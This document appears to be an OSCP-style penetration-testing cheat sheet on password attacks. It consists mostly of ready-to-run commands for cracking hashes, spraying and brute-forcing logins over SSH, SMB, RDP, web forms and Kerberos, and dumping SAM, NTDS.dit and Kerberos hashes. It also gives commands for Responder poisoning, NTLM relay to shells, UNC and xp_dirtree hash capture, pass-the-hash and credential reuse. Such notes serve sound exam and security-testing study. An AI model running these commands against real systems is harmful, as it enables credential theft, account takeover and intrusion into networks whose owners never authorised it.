# Password Attacks

> **Golden rule:** If you have a hash, identify it before you try to crack it. A wrong mode wastes hours. Always test your wordlist with a known plaintext first to confirm the mode is correct.

---

## Table of Contents

1. [Workflow — When to Crack vs Spray vs Reuse](#workflow--when-to-crack-vs-spray-vs-reuse)
2. [Identifying Hashes](#identifying-hashes)
3. [Hash Types Reference](#hash-types-reference)
   - [Linux / Unix](#linux--unix)
   - [Windows](#windows)
   - [Active Directory / Kerberos](#active-directory--kerberos)
   - [Web Apps & CMS](#web-apps--cms)
   - [Databases](#databases)
   - [Archives & Files](#archives--files)
   - [Network Auth Captures](#network-auth-captures)
4. [Hashcat — The Workhorse](#hashcat--the-workhorse)
5. [John the Ripper](#john-the-ripper)
6. [Wordlists & Rules](#wordlists--rules)
7. [Mask Attacks & Hybrid](#mask-attacks--hybrid)
8. [Custom Wordlist Generation](#custom-wordlist-generation)
9. [Online Brute Force / Spray](#online-brute-force--spray)
   - [hydra](#hydra)
   - [medusa](#medusa)
   - [ncrack](#ncrack)
   - [netexec / crackmapexec](#netexec--crackmapexec)
   - [kerbrute](#kerbrute)
10. [Service-Specific Attacks](#service-specific-attacks)
11. [Capturing Hashes](#capturing-hashes)
12. [Pass-the-Hash / Pass-the-Ticket](#pass-the-hash--pass-the-ticket)
13. [Cred Reuse Playbook](#cred-reuse-playbook)
14. [Cracking Strategy & Time Budgets](#cracking-strategy--time-budgets)

---

## Workflow — When to Crack vs Spray vs Reuse

Decision tree:

```
Got a hash?
├─ Yes ─→ Identify it (hashid / hash-identifier / the prefix)
│         ├─ Crackable on your hardware in <30 min? → hashcat / john
│         ├─ Slow (bcrypt, scrypt, argon2)?         → small targeted wordlist only
│         └─ NTLM / Kerberos?                       → pass-the-hash / overpass-the-hash first
│                                                     (no cracking needed if you can use it)
└─ No  ─→ Got a username list? → spray weak passwords (1–3 per round, watch lockouts)
          Got no users?        → enumerate (see Enumeration.md) before touching auth
```

**Rules of thumb on OSCP:**
- Online brute force is rarely the answer. Try defaults / spray known-weak first, then move on.
- Cred reuse beats cracking. A password found in `config.php` will usually work for SSH / SMB / MSSQL too.
- NTLM hashes don't need cracking — pass them. Kerberos TGS hashes from kerberoasting do.
- Watch lockout thresholds. AD default is 5 attempts → lockout. Spray with 2–3 attempts per round.

---

## Identifying Hashes

You must know the type before cracking. Wrong mode = wrong result, silently.

### Tools

```bash
# hashid (preferred — gives hashcat -m and john --format= for each match)
hashid '<hash>'
hashid -m -j '<hash>'                  # -m for hashcat mode, -j for john format

# hash-identifier (interactive)
hash-identifier

# name-that-hash (modern, with descriptions)
nth -t '<hash>'
nth -f hashes.txt
```

### Hashcat wiki — example hashes (bookmark this)

The single best reference for "what does this hash look like" is:
**https://hashcat.net/wiki/doku.php?id=example_hashes**

Every hashcat mode number (e.g. `-m 1000` NTLM, `-m 500` $1$ md5crypt) has an example hash on that page. If your hash matches the shape of the example, that's your mode. Keep it open in a tab.

Other useful pages:
- https://hashcat.net/wiki/ — main wiki
- https://hashcat.net/wiki/doku.php?id=mask_attack — mask syntax
- https://hashcat.net/wiki/doku.php?id=rule_based_attack — rules syntax
- https://github.com/openwall/john/blob/bleeding-jumbo/doc/MODES — John formats

### Identification by shape — quick visual cues

| Looks like | Likely | Mode |
|---|---|---|
| `5f4dcc3b5aa765d61d8327deb882cf99` (32 hex) | MD5 | `-m 0` |
| `2aa60a8ff7fcd473d321e0146afd9e26df395147` (40 hex) | SHA1 | `-m 100` |
| `2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824` (64 hex) | SHA256 | `-m 1400` |
| `cb3...` (128 hex) | SHA512 | `-m 1700` |
| `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0` | LM:NTLM | LM `-m 3000`, NTLM `-m 1000` |
| `31d6cfe0d16ae931b73c59d7e0c089c0` alone (32 hex, no salt) | NTLM (often) — confirm context | `-m 1000` |
| `$1$salt$hash` | md5crypt (old Linux) | `-m 500` |
| `$2a$ / $2b$ / $2y$` | bcrypt | `-m 3200` |
| `$5$rounds=...$salt$hash` | sha256crypt (Linux) | `-m 7400` |
| `$6$rounds=...$salt$hash` | sha512crypt (modern Linux `/etc/shadow`) | `-m 1800` |
| `$y$j9T$...` | yescrypt (newest Linux) | john: `crypt`, hashcat: not native |
| `$argon2id$v=19$...` | argon2 | `-m 13721/13722/13723` |
| `$krb5asrep$23$user@DOM:hex$hex` | AS-REP roast | `-m 18200` |
| `$krb5tgs$23$*user$DOM$spn*$hex$hex` | Kerberoast (RC4) | `-m 13100` |
| `$krb5tgs$17$ / $18$` | Kerberoast (AES-128/256) | `-m 19600 / 19700` |
| `$NETNTLMv2$user::DOM:chal:hex:hex` | NetNTLMv2 (responder) | `-m 5600` |
| `{SSHA}base64` | LDAP SSHA | `-m 111` |
| `$P$B...` (12 char prefix) | phpass (WordPress/phpBB) | `-m 400` |
| `$H$9...` | phpass legacy | `-m 400` |
| `pbkdf2_sha256$...$salt$hash` | Django PBKDF2 | `-m 10000` |

Don't trust hashid blindly — many short hex digests collide in shape (raw-MD5 vs NTLM are both 32 hex). Use context: if you pulled it from `lsass`, it's NTLM. If from a PHP app, MD5 is plausible.

---

## Hash Types Reference

### Linux / Unix

`/etc/shadow` format: `user:$id$salt$hash:...`

| Prefix | Algorithm | hashcat | john | Notes |
|---|---|---|---|---|
| `$1$` | md5crypt | 500 | md5crypt | Old Linux, fast to crack |
| `$2a$ $2b$ $2y$` | bcrypt | 3200 | bcrypt | Slow — wordlist only, no brute |
| `$5$` | sha256crypt | 7400 | sha256crypt | Linux mid-era |
| `$6$` | sha512crypt | 1800 | sha512crypt | Most common modern shadow |
| `$y$` | yescrypt | n/a | crypt | Newest default (Ubuntu 22+, Debian 12+) |
| `$7$` | scrypt | 8900 | scrypt | Rare |
| no `$` | DES crypt(3) | 1500 | descrypt | Truncates pw to 8 chars |

**`/etc/passwd` + `/etc/shadow` combined:**
```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=rockyou.txt unshadowed.txt
```

### Windows

| What | Where | Format | hashcat | john | Notes |
|---|---|---|---|---|---|
| LM | SAM (XP/2003) | 16-hex | 3000 | lm | Useless legacy; uppercase, ≤14 chars; cracks instantly |
| NTLM | SAM / NTDS.dit / lsass | 32-hex | 1000 | NT | The real hash; usable for pass-the-hash |
| MSCash / DCC | Cached domain creds (registry) | `M$user#hash` | 1100 | mscash | Last 10 domain logons cached locally |
| MSCashv2 / DCC2 | Vista+ cached | `$DCC2$10240#user#hash` | 2100 | mscash2 | Slow PBKDF2-HMAC-SHA1 |
| LSA secrets | registry SECURITY hive | varies | varies | varies | Service passwords often cleartext |

**SAM extraction (local):**
```bash
# From a live box (Windows) — need SYSTEM:
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
# Then offline:
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

**NTDS.dit (domain controller):**
```bash
# Remote (need DA or DCSync rights):
impacket-secretsdump -just-dc-ntlm corp.local/Administrator:Pass@dc01
impacket-secretsdump -just-dc corp.local/Administrator:Pass@dc01           # NT + LM + Kerb keys
impacket-secretsdump corp.local/krbtgt@dc01 -hashes :<NThash>              # PtH variant

# Offline NTDS.dit + SYSTEM hive:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

NTLM output format: `user:RID:LMHASH:NTHASH:::`. Strip to `user:NTHASH` for hashcat.

### Active Directory / Kerberos

| Attack | What you get | hashcat |
|---|---|---|
| AS-REP roast | `$krb5asrep$23$...` — RC4-HMAC of TGT for users with "do not require preauth" | 18200 |
| Kerberoast RC4 | `$krb5tgs$23$*...` — TGS ticket encrypted with service account NT hash | 13100 |
| Kerberoast AES128 | `$krb5tgs$17$*...` | 19600 |
| Kerberoast AES256 | `$krb5tgs$18$*...` | 19700 |
| Silver / Golden ticket | Use NT hash directly, no cracking | n/a |

```bash
# AS-REP roast (no creds needed if any user has UF_DONT_REQUIRE_PREAUTH)
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip $DC -outputfile asrep.hash

# Kerberoast (any valid AD user)
impacket-GetUserSPNs corp.local/user:pass -dc-ip $DC -request -outputfile spns.hash

# Crack
hashcat -m 18200 asrep.hash rockyou.txt -r rules/best64.rule
hashcat -m 13100 spns.hash rockyou.txt -r rules/best64.rule
```

### Web Apps & CMS

| App / format | Example | hashcat | Notes |
|---|---|---|---|
| WordPress / phpBB phpass | `$P$B...` | 400 | Slow (8192 iterations of MD5) |
| Joomla | `hash:salt` | 11 (or 100 SHA1) | Read CMS source if unsure |
| Drupal 7+ | `$S$...` | 7900 | Slow SHA512 |
| Django PBKDF2 SHA256 | `pbkdf2_sha256$...` | 10000 | |
| Django bcrypt SHA256 | `bcrypt_sha256$...` | n/a | Use john bcrypt-sha256 |
| Rails BCrypt | `$2a$...` | 3200 | Same as bcrypt |
| Flask Werkzeug | `pbkdf2:sha256:...$salt$hash` | 10900 (variant) | Check exact iteration count |
| ASP.NET Identity v3 | base64 of `\x01` + PBKDF2 | 12001 | |
| ASP.NET Identity v2 | base64 of `\x00` + PBKDF2 | 12000 | |
| MD5(unix) `{MD5}` | `{MD5}base64` | varies | Often LDAP context |
| LDAP SSHA | `{SSHA}base64` | 111 | salt at end of decoded blob |
| LDAP SHA | `{SHA}base64` | 101 | |

### Databases

| DB | Format | hashcat | Notes |
|---|---|---|---|
| MySQL 4.1+ | `*40-hex` (with `*`) | 300 | `SHA1(SHA1(pw))` |
| MySQL pre-4.1 | 16 hex | 200 | |
| PostgreSQL | `md5<hex>` of `pw+user` | 12 | weak |
| MSSQL 2000 | `0x0100<salt><sha1><sha1upper>` | 131 | |
| MSSQL 2005 | `0x0100<salt><sha1>` | 132 | |
| MSSQL 2012/2014 | `0x0200<salt><sha512>` | 1731 | |
| Oracle H | `S:<hash>` | 112 (varies by version) | Hard to ID — read banner |
| MongoDB SCRAM-SHA-1 | `SCRAM-SHA-1$...` | 24100 | |

### Archives & Files

Extract a hash from the file, then crack it.

| File | Tool to extract | hashcat |
|---|---|---|
| ZIP (legacy) | `zip2john archive.zip > z.hash` | 13600 (pkzip), 17200 if AES |
| 7z | `7z2john.pl a.7z > z.hash` | 11600 |
| RAR3 | `rar2john a.rar > z.hash` | 12500 |
| RAR5 | `rar2john a.rar > z.hash` | 13000 |
| PDF | `pdf2john.pl f.pdf > p.hash` | 10400/10500/10600/10700 (by version) |
| Office (docx/xlsx/pptx) | `office2john.py f.docx > o.hash` | 9400 (2007) / 9500 (2010) / 9600 (2013+) |
| Office old (doc/xls 97-2003) | `office2john.py` | 9700 / 9800 |
| KeePass kdb/kdbx | `keepass2john f.kdbx > k.hash` | 13400 |
| LUKS volume | `cryptsetup luksDump + custom` | 14600 (full disk image), 29541 (header) |
| BitLocker | `bitlocker2john -i img > b.hash` | 22100 |
| SSH key (encrypted) | `ssh2john id_rsa > id.hash` | 22921 (legacy: 22911) |
| GPG | `gpg2john secring.gpg > g.hash` | 16700 (varies) |
| macOS DMG | `dmg2john img.dmg > d.hash` | 16700 |
| 1Password / iTunes | various `*2john` | varies — search wiki |

### Network Auth Captures

| Hash | Source | hashcat |
|---|---|---|
| NetNTLMv1 | responder/SMB relay, old clients | 5500 |
| NetNTLMv2 | responder/SMB relay (modern) | 5600 |
| WPA / WPA2 (PMKID) | wifi handshake | 22000 (modern unified) |
| HTTP basic / digest | mitm capture | 11100 (digest) |
| SNMPv3 HMAC-MD5/SHA1 | snmp captures | 8100/7300 |
| IKE PSK aggressive | ike-scan | 5300/5400 |
| VNC challenge-response | mitm | 11500 (CRC32 — fast) |

---

## Hashcat — The Workhorse

```bash
# General form
hashcat -m <mode> -a <attack> <hashfile> <wordlist> [rules] [options]

# Attack modes (-a)
0  = wordlist
1  = combinator (two wordlists concatenated)
3  = mask / brute
6  = wordlist + mask (hybrid)
7  = mask + wordlist (hybrid)
9  = association (modern; pair hashes with hints)
```

### Most-used commands

```bash
# Straight wordlist
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt

# Wordlist + rules (best ROI)
hashcat -m 1000 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
hashcat -m 1000 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Mask (8-digit numeric)
hashcat -m 1000 ntlm.txt -a 3 ?d?d?d?d?d?d?d?d

# Hybrid: wordlist + 3-digit suffix
hashcat -m 1000 ntlm.txt -a 6 rockyou.txt ?d?d?d

# Custom charset (e.g. upper + digit + ! @ #)
hashcat -m 1000 ntlm.txt -a 3 -1 ?u?d -2 '!@#' ?1?1?1?1?2

# Continue / resume
hashcat --restore
hashcat --session=ntlm-1 ...                   # name for restorability

# Show cracked
hashcat -m 1000 ntlm.txt --show
hashcat -m 1000 ntlm.txt --show --outfile-format=2 -o cracked.txt

# Benchmark your GPU
hashcat -b                                     # all modes
hashcat -b -m 1000                             # just NTLM
```

### Performance / sanity flags

```bash
-O                          # optimized kernel (faster, password length capped — usually fine on OSCP)
-w 3                        # workload profile 1=low/2=default/3=high/4=insane (4 = unusable desktop)
--status --status-timer=10  # live status
--force                     # bypass warnings (e.g. CPU instead of GPU). Use sparingly.
-S                          # slow-hash mode (single hash) — improves speed for bcrypt etc.
--username                  # treat first col as username, second as hash (pwdump format)
--remove                    # remove cracked hashes from the file as they break
--potfile-disable           # don't write to potfile (for clean runs)
--potfile-path=./pot        # use a custom potfile
```

### Pwdump / NTDS format

If your file is `user:RID:LMHASH:NTHASH:::`, use `--username`:
```bash
hashcat -m 1000 --username ntds.dump rockyou.txt -r best64.rule --show --outfile-format=2
```

### Common Hashcat modes cheat (memorize these)

| Mode | Hash |
|---|---|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1700 | SHA512 |
| 1000 | NTLM |
| 3000 | LM |
| 1800 | sha512crypt ($6$) |
| 7400 | sha256crypt ($5$) |
| 500 | md5crypt ($1$) |
| 3200 | bcrypt |
| 1100 | DCC (MSCash) |
| 2100 | DCC2 (MSCash2) |
| 5500 | NetNTLMv1 |
| 5600 | NetNTLMv2 |
| 13100 | Kerberoast RC4 |
| 18200 | AS-REP roast RC4 |
| 19600/19700 | Kerberoast AES128/256 |
| 400 | phpass (WordPress) |
| 7900 | Drupal7 |
| 10000 | Django PBKDF2-SHA256 |
| 22000 | WPA-PBKDF2-PMKID+EAPOL |

If in doubt: https://hashcat.net/wiki/doku.php?id=example_hashes — Ctrl-F your hash shape.

---

## John the Ripper

```bash
# Identify and crack
john hashes.txt                                # auto-detect format, run default
john --list=formats                            # all supported
john --format=NT hashes.txt --wordlist=rockyou.txt
john --format=sha512crypt hashes.txt --wordlist=rockyou.txt --rules=Jumbo

# Show cracked
john --show hashes.txt
john --show --format=NT hashes.txt

# Resume
john --restore

# Single mode (uses GECOS / username munging)
john --single hashes.txt

# Incremental (true brute, slow)
john --incremental hashes.txt

# Custom rules
john --wordlist=rockyou.txt --rules=Single hashes.txt
john --wordlist=rockyou.txt --rules=KoreLogic hashes.txt
```

### Useful `*2john` extractors

All ship with John Jumbo. Output is a single-line hash you feed to `john` or hashcat (modes above).

```bash
ssh2john id_rsa > id.hash                       # encrypted SSH key
zip2john secrets.zip > z.hash
rar2john vault.rar > r.hash
7z2john.pl pkg.7z > 7z.hash
pdf2john.pl doc.pdf > pdf.hash
office2john.py budget.xlsx > o.hash
keepass2john vault.kdbx > kp.hash
bitlocker2john -i image.dd > bl.hash
gpg2john secring.gpg > gpg.hash
```

Most extractors are in `/usr/share/john/` on Kali.

### When to prefer John over Hashcat

- CPU-only target (no GPU) — John is fine on CPU.
- Weird formats hashcat doesn't support (some `*2john` outputs).
- You want single-mode username-based mangling (john is great at this).

### When to prefer Hashcat

- You have a GPU (10–1000× faster than CPU for most modes).
- Standard hash formats (NTLM, SHA, crypt, Kerberos).
- Anything where you'll iterate with rules.

---

## Wordlists & Rules

### Wordlists (Kali default locations)

```bash
/usr/share/wordlists/rockyou.txt.gz             # gunzip it first
/usr/share/wordlists/fasttrack.txt
/usr/share/seclists/Passwords/                  # huge, organized
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/seclists/Passwords/Common-Credentials/best110.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
/usr/share/seclists/Passwords/probable-v2-top12000.txt
```

If `rockyou.txt` doesn't crack it in 30 seconds + best64, it likely needs a custom list — pivot to CeWL or hashcat utils.

### Rules

```bash
/usr/share/hashcat/rules/best64.rule            # default best-ROI
/usr/share/hashcat/rules/d3ad0ne.rule
/usr/share/hashcat/rules/rockyou-30000.rule
/usr/share/hashcat/rules/dive.rule              # huge, slow
/usr/share/hashcat/rules/OneRuleToRuleThemAll.rule  # community favorite (download from github)
```

`best64.rule` first. If that fails, try `OneRuleToRuleThemAll`. `dive.rule` is for long offline runs only.

---

## Mask Attacks & Hybrid

Mask uses character classes. Useful when you know structure (e.g. "starts with capital, ends with year").

| Token | Charset |
|---|---|
| `?l` | a-z |
| `?u` | A-Z |
| `?d` | 0-9 |
| `?h` | 0-9a-f |
| `?H` | 0-9A-F |
| `?s` | special: `!"#$%&'()*+,-./:;<=>?@[\]^_\``{\|}~ ` |
| `?a` | all of `?l?u?d?s` |
| `?b` | 0x00-0xff |

```bash
# 8 lowercase
hashcat -m 1000 ntlm -a 3 ?l?l?l?l?l?l?l?l
# Capital + 5 lower + 2 digits
hashcat -m 1000 ntlm -a 3 ?u?l?l?l?l?l?d?d
# Year suffix on a wordlist (hybrid)
hashcat -m 1000 ntlm -a 6 rockyou.txt ?d?d?d?d
# Wordlist prefix with capital (hybrid)
hashcat -m 1000 ntlm -a 7 ?u?l?l?l rockyou.txt
# Custom: lowercase or digit
hashcat -m 1000 ntlm -a 3 -1 ?l?d ?1?1?1?1?1?1?1?1
# Common pattern "Summer2025!"
hashcat -m 1000 ntlm -a 3 -1 SsFfWwAa -2 ?d?d?d?d ?1?l?l?l?l?l?2?2?2?2?s
```

`--increment` to try lengths from min to max:
```bash
hashcat -m 1000 ntlm -a 3 --increment --increment-min=6 --increment-max=10 ?a?a?a?a?a?a?a?a?a?a
```

---

## Custom Wordlist Generation

### CeWL — scrape words from the target website

```bash
cewl -d 3 -m 5 -w cewl.txt http://$IP/
cewl -d 3 -m 5 --with-numbers -e --email_file emails.txt -w cewl.txt http://$IP/
```

`-d` depth, `-m` min word length, `-e` extract emails, `--with-numbers` keep digits.

### crunch — generate by pattern

```bash
crunch 8 8 -t @@@@@@@@ -o list.txt          # 8 lowercase
crunch 6 8 abc123 -o list.txt               # 6-8 chars from set
crunch 10 10 -t Summer%%%% -o list.txt      # "Summer" + 4 digits → 10000 entries
```

### hashcat-utils

```bash
# Combine two wordlists
combinator.bin list1.txt list2.txt > combined.txt
# Append year/specials to every word
hashcat --stdout rockyou.txt -r append-year.rule > with-year.txt
```

### username-as-password / company terms

Always include:
```bash
cat users.txt > custom.txt
# variations
sed 's/$/123/' users.txt >> custom.txt
sed 's/$/!/' users.txt >> custom.txt
sed 's/$/2024/' users.txt >> custom.txt
sed 's/$/@2024!/' users.txt >> custom.txt
# Companyname + year + ! is *the* spray pattern for AD pentests
echo -e "CompanyName123!\nCompanyName2024!\nWelcome1\nPassword1\nPassword123!\nSummer2024!\nWinter2024!" > spray.txt
```

---

## Online Brute Force / Spray

> **Caution:** Online brute force is loud and risks lockouts. On AD, default policy locks at 5 bad attempts. ALWAYS spray (few passwords across many users) rather than brute (many passwords against one user). Check the policy first: `nxc smb $DC -u user -p pass --pass-pol`.

### hydra

The classic. Fast, supports many protocols.

```bash
# SSH
hydra -L users.txt -P rockyou.txt ssh://$IP -t 4 -f
# -t threads, -f exit on first success, -F first valid on any host

# FTP
hydra -L users.txt -P rockyou.txt ftp://$IP

# HTTP basic auth
hydra -L users.txt -P rockyou.txt $IP http-get /admin/

# HTTP form POST (the tricky one)
hydra -l admin -P rockyou.txt $IP http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid login"
# Format: "<path>:<post-body-with-^USER^-^PASS^>:<failure-string>"
# Use S=<success-string> instead if you can't reliably detect failure
# Use H=Cookie: PHPSESSID=xxx to include headers

# HTTPS form
hydra -l admin -P rockyou.txt $IP https-post-form "/login.php:..."

# SMB (careful with lockouts)
hydra -L users.txt -P rockyou.txt $IP smb

# RDP
hydra -L users.txt -P rockyou.txt rdp://$IP

# POP3 / IMAP / SMTP / MSSQL / MYSQL / VNC / TELNET — all supported
hydra -L users.txt -P rockyou.txt mysql://$IP
```

Useful flags:
- `-l <user>` / `-L <userfile>` — single user / file
- `-p <pass>` / `-P <passfile>` — single pass / file
- `-t <n>` — parallel tasks (lower for fragile services, default 16)
- `-f` — stop on first success
- `-V` — verbose (show each attempt)
- `-vV` — really verbose
- `-e nsr` — also try: n=null, s=same-as-user, r=reversed-user
- `-o out.txt` — write results
- `-s <port>` — non-default port
- `-w <sec>` — wait between (when service is slow / rate-limiting)

### medusa

Similar to hydra, sometimes more reliable on some protocols.

```bash
medusa -h $IP -U users.txt -P rockyou.txt -M ssh -t 4 -f
medusa -h $IP -U users.txt -P rockyou.txt -M smbnt -t 1     # SMB, single thread
medusa -d                                                     # list modules
```

### ncrack

```bash
ncrack -U users.txt -P rockyou.txt ssh://$IP
ncrack -U users.txt -P rockyou.txt rdp://$IP -p 3389
ncrack --list-services
```

### netexec / crackmapexec

The Swiss army knife for AD-style protocols. `nxc` is the maintained fork of `crackmapexec`.

```bash
# Spray (preferred over hydra for SMB/WinRM/MSSQL/etc)
nxc smb $IP -u users.txt -p Welcome1 --continue-on-success
nxc smb 10.10.10.0/24 -u admin -p Password1                  # whole subnet
nxc smb $IP -u user -H <NTHASH>                              # pass the hash
nxc smb $IP -u user -p pass --shares --users --groups        # enum after auth

# Other protocols
nxc winrm $IP -u user -p pass
nxc ldap $IP -u user -p pass
nxc mssql $IP -u sa -p '' --local-auth
nxc ssh $IP -u root -p toor
nxc ftp $IP -u anonymous -p anonymous
nxc rdp $IP -u user -p pass --nla-screenshot

# Crackmapexec equivalents (same args)
crackmapexec smb $IP -u user -p pass
```

Don't fire without `--continue-on-success` if you want to spray more than one password.

### kerbrute

For AD username enumeration and password spray against Kerberos — no logon failures generated (won't increment badPwdCount the same way auth does — but read your engagement rules).

```bash
kerbrute userenum --dc $DC -d corp.local users.txt
kerbrute passwordspray --dc $DC -d corp.local users.txt 'Summer2024!'
kerbrute bruteuser --dc $DC -d corp.local rockyou.txt validuser
```

---

## Service-Specific Attacks

### SSH

```bash
hydra -L users.txt -P passes.txt ssh://$IP -t 4
nxc ssh $IP -u users.txt -p passes.txt
# Key files found? Crack passphrase:
ssh2john id_rsa > id.hash
john --wordlist=rockyou.txt id.hash
```

### FTP

```bash
hydra -L users.txt -P passes.txt ftp://$IP
# Try defaults first: anonymous:anonymous, anonymous:<blank>, ftp:ftp
```

### SMB / Windows

```bash
# Check policy first to avoid lockouts
nxc smb $DC -u guest -p '' --pass-pol
# Spray (one password at a time, all users)
nxc smb $DC -u users.txt -p 'Welcome1' --continue-on-success
nxc smb $DC -u users.txt -p 'Password123!' --continue-on-success
```

### RDP

```bash
nxc rdp $IP -u users.txt -p pass --continue-on-success
hydra -L users.txt -P passes.txt rdp://$IP
```

### Web logins

```bash
# 1) Identify the form: method, fields, failure string. Use browser devtools.
# 2) Confirm failure pattern manually with curl:
curl -i -d 'user=admin&pass=wrong' http://$IP/login
# 3) Then hydra:
hydra -l admin -P rockyou.txt $IP http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid"

# ffuf for web brute (great for JSON APIs / weird auth)
ffuf -u http://$IP/login -X POST -d 'user=admin&pass=FUZZ' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -w rockyou.txt -fc 401
```

### WordPress

```bash
wpscan --url http://$IP/ -e u                                # users
wpscan --url http://$IP/ -U admin -P rockyou.txt             # brute (xmlrpc is faster)
wpscan --url http://$IP/ -U admin -P rockyou.txt --password-attack xmlrpc-multicall
```

### MySQL / MSSQL / Postgres

```bash
hydra -L users.txt -P passes.txt mysql://$IP
nxc mssql $IP -u sa -p passes.txt --local-auth
# Postgres
hydra -l postgres -P passes.txt postgres://$IP
```

### SNMP community strings

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $IP
hydra -P community.txt snmp://$IP                            # also works
```

---

## Capturing Hashes

The "no creds → hash → cracked → creds" pipeline is foundational.

### Responder (LLMNR / NBT-NS / mDNS poisoning)

```bash
sudo responder -I tun0 -wv                          # start poisoning
# Wait for Windows hosts to do name resolution; you'll catch NetNTLMv2:
# user::DOMAIN:challenge:hash:hash
sudo responder -I tun0 -A                           # analyze only (no poison)

# Crack
hashcat -m 5600 captured.hash rockyou.txt -r best64.rule
```

### SMB relay (when signing not required)

```bash
# 1) Find targets without SMB signing required
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt
# 2) Run ntlmrelayx
impacket-ntlmrelayx -tf relay.txt -smb2support -i           # interactive shell on success
impacket-ntlmrelayx -tf relay.txt -smb2support -c 'whoami'  # one-shot command
# 3) Turn OFF responder's SMB/HTTP listeners so it forwards, not catches
# Edit /etc/responder/Responder.conf → SMB = Off, HTTP = Off
sudo responder -I tun0 -wv
```

### MSSQL → NTLM relay (xp_dirtree trick)

```sql
EXEC master..xp_dirtree '\\10.10.14.x\share'
```
Responder catches the NetNTLMv2 from the MSSQL service account.

### Hash via UNC injection in web apps

If a web app renders user-controlled image/file paths, inject `\\10.10.14.x\share\x` → SMB connection → captured by responder.

---

## Pass-the-Hash / Pass-the-Ticket

If you have an NT hash, **try using it before cracking it**. Most Windows / AD services accept the hash directly.

```bash
# SMB
nxc smb $IP -u user -H <NTHASH>
impacket-psexec corp.local/user@$IP -hashes :<NTHASH>
impacket-wmiexec corp.local/user@$IP -hashes :<NTHASH>
impacket-smbexec corp.local/user@$IP -hashes :<NTHASH>

# WinRM
evil-winrm -i $IP -u user -H <NTHASH>

# RDP (restricted admin mode)
xfreerdp /v:$IP /u:user /pth:<NTHASH> /cert:ignore

# Mount share
impacket-smbclient -hashes :<NTHASH> corp.local/user@$IP
```

### Overpass-the-hash → TGT

```bash
impacket-getTGT corp.local/user -hashes :<NTHASH>
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass corp.local/user@dc01
```

### Pass-the-ticket

```bash
# Convert ccache ↔ kirbi (Linux ↔ Windows formats)
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=$(pwd)/ticket.ccache
klist                                               # confirm
impacket-psexec -k corp.local/user@dc01
```

---

## Cred Reuse Playbook

When you find ONE credential, immediately try it against every other auth surface you've enumerated.

```
For each (user, password) pair:
  nxc smb     $IP -u user -p pass
  nxc winrm   $IP -u user -p pass
  nxc mssql   $IP -u user -p pass
  nxc rdp     $IP -u user -p pass
  nxc ssh     $IP -u user -p pass
  nxc ldap    $IP -u user -p pass
  nxc ftp     $IP -u user -p pass
  evil-winrm  -i $IP -u user -p pass         # if winrm open
  ssh         user@$IP                       # try with key too if you have one
  # web logins manually
```

Also try the password against:
- the user's email (IMAP/POP3)
- VPN / OpenVPN configs
- service accounts with the same naming pattern
- `sudo -l` then `su` to other users using the same password

---

## Cracking Strategy & Time Budgets

For the OSCP exam — set hard time limits, don't get stuck on a crack.

| Hash type | Time to give wordlist+rules attempt | If no hit |
|---|---|---|
| MD5 / SHA1 / NTLM (fast) | 5 min: rockyou + best64; 15 min: + OneRule | Move on, come back later |
| sha256/sha512crypt ($5/$6) | 15 min: rockyou top 100k + best64 | Targeted CeWL list only |
| bcrypt ($2y$) | 5 min: rockyou top 10k only | Move on — bcrypt is slow by design |
| Kerberoast RC4 (13100) | 15 min: rockyou + best64 + OneRule | Custom company list, then move on |
| AS-REP roast (18200) | 15 min: same as kerberoast | |
| NetNTLMv2 (5600) | 15 min: rockyou + best64 | |
| zip/rar/office | 15 min: rockyou; reduce wordlist by topic if needed | |

**Quick triage before committing GPU time:**

```bash
# 1) Length / pattern obvious? Mask first.
# 2) Words from the box? CeWL the web app, prepend that.
# 3) Username = password? john --single covers it.
# 4) Known leaked? Check potfile / HIBP-style lookup.
echo -n "Welcome1" | md5sum                           # sanity check known-plaintext
```

**Don't forget:** `hashcat --show` against your potfile after every crack — sometimes you've already cracked it on a previous box.

```bash
hashcat -m 1000 hashes.txt --show
cat ~/.local/share/hashcat/hashcat.potfile             # everything you've ever cracked
```
